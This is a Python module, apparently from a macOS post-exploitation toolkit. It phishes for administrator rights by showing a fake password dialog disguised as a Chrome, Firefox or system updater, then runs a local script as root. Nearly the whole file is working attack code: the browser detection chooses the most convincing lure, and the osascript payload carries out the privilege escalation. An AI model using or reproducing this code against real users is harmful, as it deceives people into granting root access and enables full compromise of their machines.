import os
import plistlib
import subprocess
from xml.parsers.expat import ExpatError

try:
    input = raw_input
except NameError:
    pass

__cve__ = ""
__credits__ = "thehappydinoa"

browsers = {
    "com.google.chrome": "Google Chrome Updater",
    "org.mozilla.firefox": "Firefox Updater"
}


def default_browser():
    try:
        plist = plistlib.readPlist(os.path.expanduser(
            "~") + "/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist")
    except ExpatError:
        return
    handlers = plist.get("LSHandlers")
    for handler in handlers:
        scheme = handler.get("LSHandlerURLScheme")
        if scheme and scheme == "https":
            return handler.get("LSHandlerRoleAll")
    return


def osascript(command):
    osa = subprocess.Popen([command], shell=True, stdout=subprocess.PIPE)
    response = osa.communicate()[0].strip()
    if isinstance(response, bytes):
        return response.decode("utf-8")
    return response


def admin_prompt(app=None, prompt="System Update", command="echo hello"):
    if app:
        payload = """osascript -e 'tell app "{app}" to activate' -e 'tell application "{app}" to do shell script "{command}; echo success" with prompt "{prompt}" with administrator privileges'""".format(
            app=app, prompt=prompt, command=command)
    else:
        payload = """osascript -e 'do shell script "{command}; echo success" with prompt "{prompt}" with administrator privileges'""".format(
            prompt=prompt, command=command)
    print("Prompting: " + prompt)
    response = osascript(payload)
    print(response)
    return "success" in response


def vulnerable(version):
    return "y" == input("[USER INTERACTION] Do you want to try to phish for sudo? (y/N): ")[0].lower()


def run():
    command = "python " + os.getcwd() + "/run_as_sudo.py"

    browser = default_browser()
    if browser and browser in browsers.keys():
        return admin_prompt(prompt=browsers.get(browser), command=command)
    return admin_prompt(command=command)
